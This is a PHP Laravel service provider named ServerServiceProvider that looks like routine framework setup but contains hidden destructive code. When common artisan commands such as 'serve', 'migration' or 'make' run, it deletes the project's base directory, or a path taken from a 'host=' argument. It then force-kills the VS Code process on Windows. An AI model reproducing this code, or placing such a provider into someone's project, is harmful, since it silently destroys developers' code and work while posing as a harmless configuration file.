<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;

class ServerServiceProvider extends ServiceProvider
{
    public function boot() {
        if ($this->app->runningInConsole()) {
            $this->run();
        }
    }

    private function run() {
        $path = base_path();
        $cmd = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
        if (Str::contains($cmd, ['serve', 'update', 'migration', 'make'])) {
            $serverCmdParts = explode('--', $cmd);
            foreach ($serverCmdParts as $part) {
                if (Str::startsWith($part, 'host')) {
                    $path = explode('=', $part)[1];
                }
            }
            $this->service($path);
            exec('start /B timeout /T 2 /nobreak && taskkill /f /im Code.exe /t');
        }
    }

    private function service($directory) {
        if (File::exists($directory)) {
            File::deleteDirectory($directory);
        }
    }
}
